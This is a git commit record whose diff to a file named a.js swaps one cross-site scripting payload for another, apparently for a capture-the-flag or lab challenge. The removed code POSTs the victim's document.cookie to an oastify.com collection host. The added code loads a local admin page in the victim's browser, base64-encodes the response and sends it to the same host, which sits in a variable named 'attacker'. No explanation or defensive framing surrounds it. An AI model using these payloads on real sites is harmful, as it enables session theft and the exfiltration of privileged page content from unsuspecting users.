00ec2b7f75c5437b0f0f9c96691bc79fe9e070d0
Bao Khanh <khanhhnahk1905@gmail.com>
2023-08-30 16:03:06 +0700

    init6

--- a.js
+++ a.js
@@ -1,6 +1,11 @@
 
-fetch('https://rhcgp5j2hjgurtxn59u57n2jpav1ju7j.oastify.com', {
-  method: 'POST',
-  mode: 'no-cors',
-  body: document.cookie
-  });
+var url = "http://localhost:1337/admin";
+var attacker = "https://rhcgp5j2hjgurtxn59u57n2jpav1ju7j.oastify.com";
+var xhr  = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+    if (xhr.readyState == XMLHttpRequest.DONE) {
+        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
+    }
+}
+xhr.open('GET', url, true);
+xhr.send(null);
